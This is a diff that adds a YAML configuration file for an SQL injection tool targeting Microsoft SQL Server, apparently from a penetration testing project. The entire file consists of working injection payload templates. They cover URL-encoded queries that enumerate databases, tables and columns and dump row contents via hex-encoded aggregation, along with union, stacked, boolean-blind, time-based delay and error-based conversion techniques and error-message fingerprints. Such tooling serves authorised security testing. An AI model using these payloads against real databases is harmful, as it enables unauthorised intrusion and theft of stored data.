@@ -1,0 +1,329 @@
+vendor: SQL Server
+
+resource:
+ info: |
+  select
+      %20@@version
+      %2b'${enclose_value_sql}'
+      %2bdb_name()
+      %2b'${enclose_value_sql}'
+      %2buser
+
+ schema:
+  database: |
+   select
+       replace(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
+                       (
+                           select replace(sys.fn_varbintohexstr(cast(
+                               ','
+                               %2b'${enclose_value_sql}'
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
+                           )),'0x','')
+                           from (
+                               select
+                                   name,
+                                   row_number() over (order by(select 1)) as rnum
+                               from master..sysdatabases
+                           )x
+                           where 1=1
+                           ${limit}
+                           for xml path('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           ),
+           ',',
+           '${separator_cell_sql}'
+       )
+
+  table: |
+   select
+       replace(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
+                       (
+                           select replace(sys.fn_varbintohexstr(cast(
+                               ','
+                               %2b'${enclose_value_sql}'
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
+                           )),'0x','')
+                           from (
+                               select
+                                   name,
+                                   row_number() over (order by(select 1)) as rnum
+                               from ${database}..sysobjects
+                               where xtype='U'
+                           )x
+                           where 1=1
+                           ${limit}
+                           for xml path('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           ),
+           ',',
+           '${separator_cell_sql}'
+       )
+
+  column: |
+   select
+       replace(
+           convert(
+               varchar(max),
+               convert(
+                   varbinary(max),
+                   '0'%2bstuff(
+                       (
+                           select replace(sys.fn_varbintohexstr(cast(
+                               ','
+                               %2b'${enclose_value_sql}'
+                               %2bcast(name as varchar(max))
+                               %2b'${separator_qte_sql}0${enclose_value_sql}'
+                               as varbinary(max)
+                           )),'0x','')
+                           from (
+                               select
+                                   c.name,
+                                   row_number() over (order by(select 1)) as rnum
+                               from
+                                   ${database}..syscolumns c,
+                                   ${database}..sysobjects t
+                               where c.id=t.id
+                               and t.name='${table}'
+                           )x
+                           where 1=1
+                           ${limit}
+                           for xml path('')
+                       ),
+                       1,
+                       1,
+                       ''
+                   ),
+                   2
+               )
+           ),
+           ',',
+           '${separator_cell_sql}'
+       )
+
+  row:
+   query: |
+    select
+        replace(
+            convert(
+                varchar(max),
+                convert(
+                    varbinary(max),
+                    '0'%2bstuff(
+                        (
+                            select
+                                replace(sys.fn_varbintohexstr(cast(
+                                    ','
+                                    %2b'${enclose_value_sql}'
+                                    %2bcast(${fields} as varchar(max))
+                                    %2b'${separator_qte_sql}0${enclose_value_sql}'
+                                    as varbinary(max)
+                                )),'0x','')
+                            from (
+                                select
+                                    *,
+                                    row_number() over (order by(select 1)) as rnum
+                                from ${database}.dbo.${table}
+                            )x
+                            where 1=1
+                            ${limit}
+                            for xml path('')
+                        ),
+                        1,
+                        1,
+                        ''
+                    ),
+                    2
+                )
+            ),
+            ',',
+            '${separator_cell_sql}'
+        )
+   fields:
+    field: |
+     ltrim(
+         rtrim(
+             coalesce(
+                 ${field.value},
+                 ''
+             )
+         )
+     )
+    concat: "%2b '%7f' %2b"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           '${lead}'
+           %2bsubstring(
+               coalesce(
+                   (${injection}),
+                   ''
+               ),
+               ${window.char},
+               65536
+           )
+           %2b'${trail_sql}'
+   )
+  limit: and rnum between ${limit.value} and 65536
+  failsafe: convert(varchar, (1337${indice}7330%2b1))
+  calibrator: replicate(${calibrator_hex}, 1024)
+  limitBoundary: 1
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    # Spring
+    - No column name was specified for column .* of '.*'. \[SQL State=.*, DB Errorcode=.*\]
+    - Incorrect syntax near '.*'\. \[SQL State=.*, DB Errorcode=.*\]
+    - An object or column name is missing or empty\. For SELECT INTO statements, verify each column has a name\. For other statements, look for empty alias names\. Aliases defined as "" or \[\] are not allowed\. Change the alias to a valid name\. \[SQL State=.*, DB Errorcode=.*\]
+    - Unclosed quotation mark after the character string '.*'\. \[SQL State=.*, DB Errorcode=.*\]
+    - Unclosed quotation mark after the character string '
+    # Other
+    - \[Microsoft\]\[SQL Server
+    - SQL Server
+   orderByErrorMessage:
+    - The ORDER BY position number 1337 is out of range of the number of items in the select list
+
+ normal:
+  indices: union select ${indices}
+  capacity: (select concat('${lead}${indice}', ${calibrator}))
+  orderBy: order by 1337
+
+ stacked: ; select ${window}
+
+ boolean:
+  test:
+   falses:
+    - 1 = 0
+    - "'a' %21= 'a'"
+    - "'b' %21= 'b'"
+    - 1 = 2
+    - 1 %21= 1
+    - 2 %21= 2
+   trues:
+    - 1 = 1
+    - 0 = 0
+    - "'a' %21= 'b'"
+    - "'a' = 'a'"
+    - 2 = 2
+    - 1 %21= 2
+   initialization: 0%2b1 = 1
+   bit: |
+    0 != (
+        ascii(
+            substring(
+                ${injection},
+                ${window.char},
+                1
+            )
+        )
+        %26${bit}
+    )
+  modeAnd: and
+  modeOr: or
+  blind: ${boolean.mode} ${test}
+  # TODO no boolean mode here on Time for sqlserver
+  time: |
+   ; if (${test})
+       waitfor delay '00:00:00'
+   else
+       waitfor delay '00:00:${sleep_time}'
+  
+ error:
+  method:
+  
+   - name: Cast:or explicit
+     query: |
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=convert(int,(
+          ${window}
+      ))
+     capacity: 1991 
+           
+   - name: Cast:and explicit
+     query: |
+      and 1=convert(int,(
+          ${window}
+      ))
+     capacity: 1991       
+  
+   - name: Cast:stacked explicit
+     # TODO Not tested
+     query: |
+      ; select convert(int,(
+          ${window}
+      ))
+     capacity: 1991 
+  
+   - name: Cast:or implicit
+     query: |
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=1/(
+          ${window}
+      )
+     capacity: 1991 
+           
+   - name: Cast:and implicit
+     query: |
+      and 1=1/(
+          ${window}
+      )
+     capacity: 1991       
+  
+   - name: Cast:stacked implicit
+     # TODO Not tested
+     query: |
+      ; select 1/(
+          ${window}
+      )
+     capacity: 1991 
+  
+   - name: User_name:or
+     query: |
+      /* Conversion failed when converting the nvarchar value '<sqli>' to data type int. */
+      or 1=user_name((
+          ${window}
+      ))
+     capacity: 1991 
+           
+   - name: User_name:and
+     query: |
+      and 1=user_name((
+          ${window}
+      ))
+     capacity: 1991       
+  
+   - name: User_name:stacked
+     # TODO Not tested
+     query: |
+      ; select user_name((
+          ${window}
+      ))
+     capacity: 1991 
